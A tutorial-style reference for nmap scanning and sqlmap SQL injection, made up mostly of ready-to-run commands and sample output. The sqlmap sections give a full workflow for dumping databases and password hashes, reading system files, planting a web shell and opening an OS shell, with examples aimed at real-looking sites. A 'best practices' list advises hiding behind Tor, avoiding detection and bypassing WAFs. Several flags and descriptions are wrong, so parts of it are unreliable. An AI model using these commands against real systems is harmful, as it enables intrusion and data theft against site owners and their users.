# nmap & sqlmap

---

# Complete Nmap Documentation for Ethical Hacking & Penetration Testing

## Table of Contents
1. Introduction to Nmap
2. Installation Guide
3. Basic Nmap Commands
4. Advanced Nmap Techniques
5. Nmap Scripting Engine (NSE)
6. Practical Examples for Network Security Assessments
7. Best Practices for Authorized Penetration Testing

---

## 1. Introduction to Nmap

Nmap (Network Mapper) is an open-source network scanning tool designed for security experts, network administrators, and IT professionals. It helps map networks, identify active hosts, and detect services. With capabilities for operating system detection, port scanning, and vulnerability analysis, Nmap is a critical resource in cybersecurity.

### Key Benefits of Nmap
- **Network Visibility**: Provides a detailed overview of network hosts, services, and configurations
- **Vulnerability Assessments**: Detects security weaknesses and potential exploits
- **Firewall Testing**: Assesses the effectiveness of firewall configurations
- **Compliance Auditing**: Ensures adherence to network security policies
- **Service Detection**: Identifies applications and services running on network devices

---

## 2. Installation Guide

### Linux (Ubuntu/Debian)
```bash
sudo apt-get update
sudo apt-get install nmap
```

### Linux (CentOS/RHEL/Fedora)
```bash
sudo yum install nmap
# Or for newer versions:
sudo dnf install nmap
```

### macOS
First install Homebrew if you haven't already:
```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

Then install Nmap:
```bash
brew install nmap
```

### Windows
Visit the official website (https://nmap.org/download.html) and download the latest Windows installer. Run the executable and follow installation prompts.

Validate installation by running:
```bash
nmap --version
```

---

## 3. Basic Nmap Commands

### Host Discovery

**Ping Scan (Host Discovery Only)**
```bash
nmap -sn 192.168.1.0/24
```
This command discovers active hosts on the network without performing port scans.

**No Port Scan, Resolve Hostnames Only**
```bash
nmap -sn -PE -n 192.168.1.1-254
```

### Port Scanning Techniques

**Basic TCP SYN Scan (Default)**
```bash
nmap -sS 192.168.1.1
```

**TCP Connect Scan**
```bash
nmap -sT 192.168.1.1
```

**UDP Scan**
```bash
nmap -sU 192.168.1.1
```

**All Ports Scan**
```bash
nmap -p- 192.168.1.1
```

**Specific Port Range**
```bash
nmap -p 1-1000 192.168.1.1
```

**Common Ports**
```bash
nmap 192.168.1.1
```

### Service and Version Detection

**Detect Services and Versions**
```bash
nmap -sV 192.168.1.1
```

**Operating System Detection**
```bash
nmap -O 192.168.1.1
```

**Aggressive Scan (Combines multiple techniques)**
```bash
nmap -A 192.168.1.1
```

### Timing Templates

**Paranoid (Very slow)**
```bash
nmap -T0 192.168.1.1
```

**Sneaky (Slow)**
```bash
nmap -T1 192.168.1.1
```

**Polite (Normal)**
```bash
nmap -T2 192.168.1.1
```

**Normal**
```bash
nmap -T3 192.168.1.1
```

**Aggressive (Fast)**
```bash
nmap -T4 192.168.1.1
```

**Insane (Very fast)**
```bash
nmap -T5 192.168.1.1
```

---

## 4. Advanced Nmap Techniques

### Target Specification

**Single Target**
```bash
nmap 192.168.1.1
```

**Multiple Targets**
```bash
nmap 192.168.1.1 192.168.1.2 192.168.1.3
```

**IP Range**
```bash
nmap 192.168.1.1-100
```

**CIDR Notation**
```bash
nmap 192.168.1.0/24
```

**File Input**
Create a file named targets.txt with IPs, one per line:
```bash
nmap -iL targets.txt
```

### Advanced Port Scanning Options

**Scan Specific Ports**
```bash
nmap -p 22,80,443 192.168.1.1
```

**Scan by Service Name**
```bash
nmap -p http,https 192.168.1.1
```

**Fast Scan (Top 100 Common Ports)**
```bash
nmap -F 192.168.1.1
```

### Evasion Techniques (Authorized Testing Only)

**Fragment Packets**
```bash
nmap -f 192.168.1.1
```

**Custom Packet Size Fragmentation**
```bash
nmap --mtu 16 192.168.1.1
```

**Decoy Scanning**
```bash
nmap -D RND:10 192.168.1.1
```

**Source Port Spoofing**
```bash
nmap --source-port 53 192.168.1.1
```

---

## 5. Nmap Scripting Engine (NSE)

The Nmap Scripting Engine allows users to write and share scripts to automate various networking tasks.

### Categories of NSE Scripts

**Safe Scripts**
```bash
nmap --script safe 192.168.1.1
```

**Intrusive Scripts**
```bash
nmap --script intrusive 192.168.1.1
```

**Vulnerability Detection**
```bash
nmap --script vuln 192.168.1.1
```

**Authentication Bypass Tests**
```bash
nmap --script auth 192.168.1.1
```

### Specific Useful Scripts

**Banner Grabbing**
```bash
nmap --script banner 192.168.1.1
```

**HTTP Enumeration**
```bash
nmap --script http-enum 192.168.1.1
```

**SSL/TLS Analysis**
```bash
nmap --script ssl-enum-ciphers -p 443 192.168.1.1
```

**SMB Vulnerability Checks**
```bash
nmap --script smb-vuln* -p 445 192.168.1.1
```

---

## 6. Practical Examples for Network Security Assessments

### Scanning Your Local Network
```bash
# Discover active hosts
nmap -sn 192.168.1.0/24

# Identify open ports on discovered hosts
nmap -sS -p- 192.168.1.0/24

# Comprehensive scan of a specific host
nmap -A -T4 192.168.1.1
```

### Router and IoT Device Assessment
```bash
# Check for common router ports
nmap -p 21,22,23,80,443,3389 192.168.1.1

# Service detection for administrative interfaces
nmap -sV -p 80,443 192.168.1.1

# Attempt to detect default credentials vulnerabilities
nmap --script http-default-accounts -p 80,443 192.168.1.1
```

### Web Application Scanning
```bash
# Enumerate web directories
nmap --script http-enum 192.168.1.1

# Identify web server vulnerabilities
nmap --script http-vuln* 192.168.1.1

# Check for HTTP methods
nmap --script http-methods 192.168.1.1
```

### Database Security Assessment
```bash
# Scan for database ports
nmap -p 1433,3306,5432,1521,27017 192.168.1.0/24

# Check for MongoDB instances without authentication
nmap -p 27017 --script mongo-info 192.168.1.0/24
```

---

## 7. Output Options

### Normal Output
```bash
nmap -oN output.txt 192.168.1.1
```

### XML Output (For importing into other tools)
```bash
nmap -oX output.xml 192.168.1.1
```

### Grepable Output
```bash
nmap -oG output.gnmap 192.168.1.1
```

### All Formats
```bash
nmap -oA output_filename 192.168.1.1
```

---

## 8. Best Practices for Authorized Penetration Testing

### Pre-Engagement Considerations

1. **Always Obtain Written Authorization**: Ensure you have explicit permission to test the target networks and systems.

2. **Define Scope Clearly**: Clearly outline which systems, networks, and testing methods are approved.

3. **Schedule Appropriately**: Plan tests during off-peak hours to minimize impact on business operations.

### Execution Guidelines

1. **Start Slow**: Begin with less aggressive scanning techniques to understand the environment.

2. **Document Everything**: Keep detailed logs of all commands executed and results obtained.

3. **Monitor Network Impact**: Watch for unusual network behavior or performance degradation.

### Post-Assessment Procedures

1. **Secure Data**: Protect any sensitive information discovered during testing.

2. **Detailed Reporting**: Create comprehensive reports outlining vulnerabilities found and recommendations for remediation.

3. **Cleanup**: Ensure all temporary files or artifacts created during testing are removed.

### Legal and Ethical Reminders

1. **Scope Adherence**: Do not exceed the written boundaries of your authorization.

2. **Data Handling**: Treat all discovered information with appropriate confidentiality.

3. **Disclosure**: Report vulnerabilities responsibly through proper channels.

---

## Appendix: Quick Reference Command Summary

| Command | Purpose |
|---------|---------|
| `nmap -sn TARGET` | Host discovery only |
| `nmap -sS TARGET` | TCP SYN scan |
| `nmap -sV TARGET` | Service/version detection |
| `nmap -O TARGET` | Operating system detection |
| `nmap -A TARGET` | Aggressive scan (combines multiple techniques) |
| `nmap -p PORTS TARGET` | Scan specific ports |
| `nmap -T4 TARGET` | Faster timing template |
| `nmap --script SCRIPT CATEGORY TARGET` | Run NSE scripts |

# Complete SQLMap Documentation & Usage Guide

## Table of Contents
1. Introduction
2. Installation
3. Basic Usage
4. Common Commands
5. Advanced Techniques
6. Database Enumeration
7. Data Extraction
8. Bypassing WAF & Filters
9. Practical Examples
10. Best Practices & Legal Considerations

---

## 1. Introduction to SQLMap

### What is SQLMap?

SQLMap is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities in web applications. It is written in Python and supports a wide range of database management systems (DBMS) including MySQL, PostgreSQL, Oracle, MSSQL, and more.

### Key Features

- **Automatic SQL Injection Detection** - Identifies SQL injection vulnerabilities without manual testing
- **Multiple DBMS Support** - Works with MySQL, PostgreSQL, Oracle, MSSQL, SQLite, Sybase, and IBM DB2
- **Advanced Detection Techniques** - Boolean-based blind, Time-based blind, Error-based, Union query, Stacked queries, Out-of-band
- **Database Enumeration** - Extracts database structure, tables, columns, and data
- **Database Fingerprinting** - Identifies database version and type
- **Operating System Access** - Can read/write files and execute OS commands
- **Bypass Capabilities** - Bypasses WAF, CSRF tokens, and various security filters
- **Proxy Support** - Can work through proxies and Tor for anonymity

### Why Use SQLMap?

SQLMap is essential for security professionals because:
- Automates tedious manual SQL injection testing
- Saves time in penetration testing engagements
- Discovers vulnerabilities that might be missed by manual testing
- Helps demonstrate SQL injection risks to stakeholders
- Educational value for learning SQL injection techniques

---

## 2. Installation

### Prerequisites

- Python 3.x (SQLMap requires Python)
- Linux, macOS, or Windows system
- Basic command-line knowledge

### Installation Methods

#### Method 1: GitHub (Recommended)

```bash
# Clone the repository
git clone https://github.com/sqlmapproject/sqlmap.git

# Navigate to directory
cd sqlmap

# Run SQLMap
python sqlmap.py
```

#### Method 2: APT (Ubuntu/Debian)

```bash
sudo apt-get update
sudo apt-get install sqlmap
```

#### Method 3: Snap

```bash
sudo snap install sqlmap
```

#### Method 4: Pre-installed (Kali Linux)

SQLMap comes pre-installed on Kali Linux and other penetration testing distributions.

#### Verify Installation

```bash
sqlmap --version
sqlmap -h  # Display help menu
```

---

## 3. Basic Usage

### Syntax

```bash
sqlmap [options]
```

### Most Common Options

| Option | Description |
|--------|-------------|
| `-u URL` | Target URL (e.g., `http://example.com/page.php?id=1`) |
| `-p PARAM` | Specify parameter to test (e.g., `-p id`) |
| `--dbs` | Enumerate databases |
| `--tables` | List tables in database |
| `--columns` | List columns in table |
| `--dump` | Extract data from table |
| `-D DB` | Specify database name |
| `-T TABLE` | Specify table name |
| `--all` | Retrieve everything |
| `--batch` | Never ask for user input (use defaults) |
| `-v LEVEL` | Verbosity level (0-6) |

### Example 1: Basic SQL Injection Test

```bash
sqlmap -u "http://example.com/login.php?id=1" --batch
```

This command:
- Tests the URL for SQL injection vulnerabilities
- Uses `--batch` flag to automatically answer prompts
- Displays results without asking questions

### Example 2: Specify Parameter

```bash
sqlmap -u "http://example.com/login.php?id=1&name=admin" -p id --batch
```

This tests only the `id` parameter, not `name`.

---

## 4. Common Commands & Their Functions

### 4.1 Detection & Testing

#### Basic SQL Injection Test
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1"
```

#### Test Multiple Parameters
```bash
sqlmap -u "http://example.com/page.php?id=1&name=test"
```

#### Test with POST Data
```bash
sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin"
```

#### Test Specific Injection Technique
```bash
# Boolean-based blind
sqlmap -u "http://example.com/page.php?id=1" --technique=BOOL

# Time-based blind
sqlmap -u "http://example.com/page.php?id=1" --technique=TIME

# Error-based
sqlmap -u "http://example.com/page.php?id=1" --technique=ERROR

# Union-based
sqlmap -u "http://example.com/page.php?id=1" --technique=UNION

# Stacked queries
sqlmap -u "http://example.com/page.php?id=1" --technique=STACKED
```

### 4.2 Database Enumeration

#### List All Databases
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs
```

#### List Tables in Specific Database
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name --tables
```

#### List Columns in Specific Table
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name --columns
```

#### List Column Types
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name -x
```

### 4.3 Data Extraction

#### Extract All Data from Table
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name --dump
```

#### Extract Specific Column
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -D database_name -T table_name -C username,password --dump
```

#### Extract All Data from All Databases
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --dump-all
```

#### Extract Only User Accounts
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --users
```

#### Extract Password Hashes
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --passwords
```

### 4.4 Operating System Access

#### Read File from Target System
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-read="/etc/passwd"
```

#### Write File to Target System
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

#### Execute OS Shell Commands
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --os-shell
```

#### Execute SQL Shell
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell
```

---

## 5. Advanced Techniques

### 5.1 Authentication & Cookies

#### Using Cookies
```bash
sqlmap -u "http://example.com/page.php?id=1" --cookie="SESSIONID=abc123def456"
```

#### Extract Cookies from Burp Suite
```bash
sqlmap -u "http://example.com/page.php?id=1" -b  # Auto extract from browser
```

#### Using Username & Password
```bash
sqlmap -u "http://example.com/page.php?id=1" --auth-type=Basic --auth-cred="username:password"
```

### 5.2 Custom HTTP Headers

#### Add Custom Headers
```bash
sqlmap -u "http://example.com/page.php?id=1" --headers="X-Custom-Header: value"
```

#### Specify User-Agent
```bash
sqlmap -u "http://example.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

#### Bypass X-Forwarded-For
```bash
sqlmap -u "http://example.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"
```

### 5.3 Proxy & Anonymity

#### Use HTTP Proxy
```bash
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

#### Use Burp Suite Proxy
```bash
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --proxy-type=HTTP
```

#### Route Through Tor
```bash
sqlmap -u "http://example.com/page.php?id=1" --tor --tor-port=SOCKS5://127.0.0.1:9050
```

#### Check Tor IP
```bash
sqlmap -u "http://example.com/page.php?id=1" --tor --check-tor
```

### 5.4 Bypassing WAF & Filters

#### WAF Detection & Bypass
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" --waf-detection
sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=space2comment
```

#### Popular Tamper Scripts
```bash
# Space to comment bypass
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment

# Space to plus
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2plus

# Case randomization
sqlmap -u "http://example.com/page.php?id=1" --tamper=randomcase

# Append comments
sqlmap -u "http://example.com/page.php?id=1" --tamper=appendnullbyte

# Multiple tamper scripts
sqlmap -u "http://example.com/page.php?id=1" --tamper=space2comment,between
```

### 5.5 CSRF Token Handling

#### Auto Detect CSRF Token
```bash
sqlmap -u "http://example.com/form.php" --csrf-token="csrf_token_name"
```

#### Specify CSRF Token in POST Data
```bash
sqlmap -u "http://example.com/form.php" --data="username=admin&password=pass&csrf=token123"
```

### 5.6 Second-Order SQL Injection

```bash
sqlmap -u "http://example.com/injection.php" --second-url="http://example.com/view.php"
```

---

## 6. Database Fingerprinting

### Get Database Information
```bash
sqlmap -u "http://example.com/vulnerable.php?id=1" -f
```

This retrieves:
- Database Management System (DBMS)
- DBMS Version
- Operating System
- Architecture (32-bit/64-bit)
- Hostname/IP Address

### Example Output
```
[*] MySQL >= 5.0.0 (likely version 5.7.28)
[*] Operating system: Linux
[*] Database user: 'root'@'localhost'
```

---

## 7. Complete Data Extraction Workflow

### Step 1: Identify Vulnerable Parameter
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch
```

### Step 2: List Available Databases
```bash
sqlmap -u "http://example.com/page.php?id=1" --dbs --batch
```

Example Output:
```
available databases [3]:
[*] information_schema
[*] mysql
[*] users_database
```

### Step 3: List Tables in Target Database
```bash
sqlmap -u "http://example.com/page.php?id=1" -D users_database --tables --batch
```

Example Output:
```
Database: users_database
[4] tables:
[+] accounts
[+] orders
[+] profiles
[+] settings
```

### Step 4: List Columns in Target Table
```bash
sqlmap -u "http://example.com/page.php?id=1" -D users_database -T accounts --columns --batch
```

Example Output:
```
Database: users_database
Table: accounts
[5] columns:
[+] id
[+] username
[+] password
[+] email
[+] created_at
```

### Step 5: Extract Data
```bash
sqlmap -u "http://example.com/page.php?id=1" -D users_database -T accounts --dump --batch
```

Example Output:
```
Database: users_database
Table: accounts
[10 entries]
+----+----------+----------+-----+
| id | username | password | email |
+----+----------+----------+-----+
| 1  | admin    | pass123  | admin@example.com |
| 2  | user1    | user123  | user1@example.com |
...
```

---

## 8. Practical Examples

### Example 1: E-Commerce Site Login Bypass

```bash
# Identify injection point
sqlmap -u "http://ecommerce.com/login.php" --data="email=test@test.com&password=test" -p email --batch

# List databases
sqlmap -u "http://ecommerce.com/login.php" --data="email=test@test.com&password=test" -p email --dbs

# Extract user data
sqlmap -u "http://ecommerce.com/login.php" --data="email=test@test.com&password=test" -p email -D ecommerce_db -T users --dump
```

### Example 2: Blog Application

```bash
# Test category parameter
sqlmap -u "http://blog.com/posts.php?category=tech" -p category --batch

# Get database names
sqlmap -u "http://blog.com/posts.php?category=tech" --dbs

# Extract admin credentials
sqlmap -u "http://blog.com/posts.php?category=tech" -D blog_db -T users -C username,password --dump
```

### Example 3: Search Function

```bash
# Test search parameter with POST
sqlmap -u "http://store.com/search.php" --data="q=products&sort=price" -p q --batch

# Use Tor for anonymity
sqlmap -u "http://store.com/search.php" --data="q=products&sort=price" -p q --tor --tor-port=SOCKS5://127.0.0.1:9050

# Save results to file
sqlmap -u "http://store.com/search.php" --data="q=products&sort=price" -p q --dump --output-dir=./results
```

### Example 4: API Endpoint

```bash
# Test API parameter
sqlmap -u "http://api.example.com/users.php?id=1" -p id --batch

# Extract data with custom headers
sqlmap -u "http://api.example.com/users.php?id=1" -p id --headers="Authorization: Bearer token123" --dump
```

### Example 5: Time-Based Blind SQL Injection

```bash
# Slow application - use time-based detection
sqlmap -u "http://slow-app.com/page.php?id=1" --technique=TIME --time-sec=5 --batch

# Increase timeout
sqlmap -u "http://slow-app.com/page.php?id=1" --technique=TIME --time-sec=10
```

---

## 9. SQLMap Output & Interpretation

### Vulnerability Detected
```
[*] GET parameter 'id' is vulnerable to Boolean-based blind SQL injection
[*] Payload: 1' AND 1=1-- -
```

### Database Information
```
Database: information_schema
Database: mysql
Database: wordpress
```

### Table Enumeration
```
Database: wordpress
Table: wp_users
Table: wp_posts
Table: wp_postmeta
```

### Data Extraction
```
Database: wordpress
Table: wp_users
[3 entries]
+----+----------+----------+
| ID | user_login | user_pass |
+----+----------+----------+
| 1  | admin    | $P$B2... |
| 2  | editor   | $P$B5... |
| 3  | author   | $P$B7... |
+----+----------+----------+
```

---

## 10. Configuration File

Create `config.txt` for repeated scans:

```txt
# SQLMap Configuration File

# Target
url = http://example.com/vulnerable.php?id=1
data = username=admin&password=pass

# Database Enumeration
dbs = True
tables = True
dump = True

# Options
batch = True
verbose = 2
threads = 5

# Proxy
proxy = http://127.0.0.1:8080

# Output
output-dir = ./results
```

Run with config:
```bash
sqlmap -c config.txt
```

---

## 11. Best Practices

### 1. Always Get Permission
- Only test systems you own or have explicit permission to test
- Unauthorized access is illegal

### 2. Use VPN/Proxy
- Mask your IP address
- Use Tor or VPN for privacy
- Never directly attack from your real IP

### 3. Be Methodical
- Test one parameter at a time
- Document your findings
- Keep detailed notes

### 4. Avoid Detection
- Use `--user-agent` to mimic browsers
- Add delays with `--delay=2`
- Use tamper scripts to bypass WAF
- Rotate user agents

### 5. Optimize Scans
- Use `--technique=UNION` if errors are shown
- Use `--technique=TIME` for blind injections
- Use `-p` to specify parameters
- Use `--batch` to automate responses

### 6. Safe Testing
```bash
# Test in lab environment first
sqlmap -u "http://localhost/vulnerable.php?id=1" --batch

# Then test on authorized target
sqlmap -u "http://authorized-target.com/page.php?id=1" --batch
```

---

## 12. Common Errors & Solutions

### Error: "No parameter provided"
**Solution:** Specify parameter with `-p` flag
```bash
sqlmap -u "http://example.com/page.php?id=1" -p id
```

### Error: "Target URL seems down"
**Solution:** Check URL or add headers
```bash
sqlmap -u "http://example.com/page.php?id=1" --headers="User-Agent: Mozilla/5.0"
```

### Error: "Connection refused"
**Solution:** Check proxy settings
```bash
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080"
```

### Error: "No injection points found"
**Solution:** Try different techniques
```bash
sqlmap -u "http://example.com/page.php?id=1" --technique=BLIND
sqlmap -u "http://example.com/page.php?id=1" --technique=STACKED
```

---

## 13. SQLMap Help Reference

View all options:
```bash
sqlmap -h
sqlmap --help
```

View options by category:
```bash
sqlmap -hh
```

---


### Resources

- Official SQLMap: https://sqlmap.org
- GitHub: https://github.com/sqlmapproject/sqlmap
- Documentation: https://github.com/sqlmapproject/sqlmap/wiki
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection

---

**Disclaimer:** This documentation is for educational and authorized security testing purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before testing any system.
